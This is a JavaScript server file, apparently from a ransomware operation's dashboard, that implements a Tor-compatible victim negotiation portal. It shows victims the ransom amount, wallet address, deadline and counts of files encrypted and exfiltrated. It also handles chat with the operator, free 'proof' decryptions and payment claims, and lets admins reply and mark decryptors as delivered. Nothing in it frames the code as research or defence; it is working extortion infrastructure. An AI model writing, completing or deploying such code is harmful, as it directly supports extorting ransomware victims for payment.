// vercel-dashboard/api/victim/portal.js
// Victim negotiation portal (Tor hidden service compatible)

import { kv } from '../../lib/kv.js';
import { verifyPayloadApiKey } from '../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();

  const { victimId } = request.query;
  if (!victimId) return response.status(400).json({ error: 'victimId required' });

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response, victimId);
      case 'POST':
        return await handlePost(request, response, victimId);
      case 'PUT':
        return await handlePut(request, response, victimId);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Victim portal error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

async function handleGet(request, response, victimId) {
  const { action } = request.query;

  const victim = await kv.get(`victim:${victimId}`);
  if (!victim) {
    return response.status(404).json({ error: 'Victim not found' });
  }

  const campaign = await kv.get(`campaign:${victim.campaignId}`);
  if (!campaign) {
    return response.status(404).json({ error: 'Campaign not found' });
  }

  if (action === 'chat') {
    // Return chat history
    const messages = await kv.lrange(`victim:${victimId}:chat`, 0, -1);
    return response.json({ messages: messages.map(m => JSON.parse(m)) });
  }

  if (action === 'proof') {
    // Return available proof files
    const proofFiles = await kv.smembers(`victim:${victimId}:proof_files`) || [];
    const files = [];
    for (const fid of proofFiles) {
      const meta = await kv.get(`file:${fid}:meta`);
      if (meta) files.push(meta);
    }
    return response.json({ files });
  }

  // Return victim portal info
  return response.json({
    victimId: victim.id,
    campaignName: campaign.name,
    ransomAmount: victim.ransomAmount,
    ransomCurrency: victim.ransomCurrency,
    walletAddress: victim.walletAddress,
    contactInfo: campaign.settings?.contactInfo || 'chaos-support@onionmail.org',
    deadline: victim.deadline,
    status: victim.status,
    filesEncrypted: victim.filesEncrypted,
    filesExfiltrated: victim.filesExfiltrated,
    proofAvailable: victim.proofAvailable,
    decryptorDelivered: victim.decryptorDelivered,
    chatEnabled: true,
    onionUrl: process.env.VICTIM_ONION_URL || null,
  });
}

async function handlePost(request, response, victimId) {
  const { action, message, fileId } = request.body;

  const victim = await kv.get(`victim:${victimId}`);
  if (!victim) {
    return response.status(404).json({ error: 'Victim not found' });
  }

  if (action === 'chat') {
    // Victim sends chat message
    if (!message) return response.status(400).json({ error: 'Message required' });

    const chatMessage = {
      id: `msg_${Date.now()}_${Math.random().toString(36).substring(7)}`,
      author: 'victim',
      message,
      timestamp: new Date().toISOString(),
      read: false,
    };

    await kv.rpush(`victim:${victimId}:chat`, JSON.stringify(chatMessage));
    await kv.ltrim(`victim:${victimId}:chat`, -500, -1); // Keep last 500

    // Notify operator
    await notifyOperatorNewMessage(victimId, chatMessage);

    return response.json(chatMessage);
  }

  if (action === 'request_proof') {
    // Victim requests free decryption proof
    if (!fileId) return response.status(400).json({ error: 'fileId required' });

    const file = await kv.get(`file:${fileId}:meta`);
    if (!file || file.systemId !== victim.systemId) {
      return response.status(404).json({ error: 'File not found or not yours' });
    }

    if (file.size > 1024 * 1024) {
      return response.status(400).json({ error: 'Proof file must be < 1MB' });
    }

    // Mark file as proof
    await kv.sadd(`victim:${victimId}:proof_files`, fileId);
    await kv.hset(`file:${fileId}:meta`, { proofRequested: true, proofRequestedAt: new Date().toISOString() });

    // Notify operator
    await notifyOperatorProofRequest(victimId, fileId);

    return response.json({ success: true, message: 'Proof requested. Operator will decrypt and return file.' });
  }

  if (action === 'verify_payment') {
    // Victim claims payment made
    const { txHash } = request.body;
    if (!txHash) return response.status(400).json({ error: 'txHash required' });

    // Create payment record for monitoring
    const paymentId = `payment_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    const payment = {
      id: paymentId,
      victimId,
      campaignId: victim.campaignId,
      claimedTxHash: txHash,
      claimedAt: new Date().toISOString(),
      status: 'claimed',
      verified: false,
    };

    await kv.set(`payment:${paymentId}`, payment);
    await kv.sadd(`victim:${victimId}:payments`, paymentId);

    // Notify operator to verify
    await notifyOperatorPaymentClaim(victimId, paymentId, txHash);

    return response.json({ paymentId, message: 'Payment claim submitted. Verification in progress.' });
  }

  return response.status(400).json({ error: 'Invalid action' });
}

async function handlePut(request, response, victimId) {
  const { action, messageId, read } = request.body;

  if (action === 'mark_read' && messageId) {
    // Operator marks message as read
    const messages = await kv.lrange(`victim:${victimId}:chat`, 0, -1);
    for (let i = 0; i < messages.length; i++) {
      const msg = JSON.parse(messages[i]);
      if (msg.id === messageId) {
        msg.read = true;
        await kv.lset(`victim:${victimId}:chat`, i, JSON.stringify(msg));
        break;
      }
    }
    return response.json({ success: true });
  }

  if (action === 'operator_reply') {
    // Operator replies to victim
    const { message } = request.body;
    if (!message) return response.status(400).json({ error: 'Message required' });

    const auth = await verifyPayloadApiKey(request);
    if (!auth.valid || auth.role !== 'admin') {
      return response.status(403).json({ error: 'Admin access required' });
    }

    const chatMessage = {
      id: `msg_${Date.now()}_${Math.random().toString(36).substring(7)}`,
      author: 'operator',
      message,
      timestamp: new Date().toISOString(),
      read: false,
    };

    await kv.rpush(`victim:${victimId}:chat`, JSON.stringify(chatMessage));
    await kv.ltrim(`victim:${victimId}:chat`, -500, -1);

    return response.json(chatMessage);
  }

  if (action === 'provide_proof') {
    // Operator provides decrypted proof file
    const { fileId, decryptedContent } = request.body;
    if (!fileId || !decryptedContent) {
      return response.status(400).json({ error: 'fileId and decryptedContent required' });
    }

    const auth = await verifyPayloadApiKey(request);
    if (!auth.valid || auth.role !== 'admin') {
      return response.status(403).json({ error: 'Admin access required' });
    }

    // Store decrypted proof
    const proofId = `proof_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    await kv.set(`victim:${victimId}:proof:${proofId}`, {
      originalFileId: fileId,
      decryptedContent: Buffer.from(decryptedContent).toString('base64'),
      providedAt: new Date().toISOString(),
    });

    await kv.hset(`file:${fileId}:meta`, { proofProvided: true, proofProvidedAt: new Date().toISOString() });

    return response.json({ proofId, message: 'Proof file provided to victim' });
  }

  if (action === 'deliver_decryptor') {
    // Operator marks decryptor as delivered
    const auth = await verifyPayloadApiKey(request);
    if (!auth.valid || auth.role !== 'admin') {
      return response.status(403).json({ error: 'Admin access required' });
    }

    await kv.hset(`victim:${victimId}`, { decryptorDelivered: true, decryptorDeliveredAt: new Date().toISOString() });

    return response.json({ success: true });
  }

  return response.status(400).json({ error: 'Invalid action' });
}

async function notifyOperatorNewMessage(victimId, message) {
  // In production: webhook, Discord, Telegram, email
  console.log(`New victim message: ${victimId} - ${message.message.substring(0, 50)}...`);
}

async function notifyOperatorProofRequest(victimId, fileId) {
  console.log(`Proof requested: ${victimId} - file ${fileId}`);
}

async function notifyOperatorPaymentClaim(victimId, paymentId, txHash) {
  console.log(`Payment claimed: ${victimId} - ${paymentId} - ${txHash}`);
}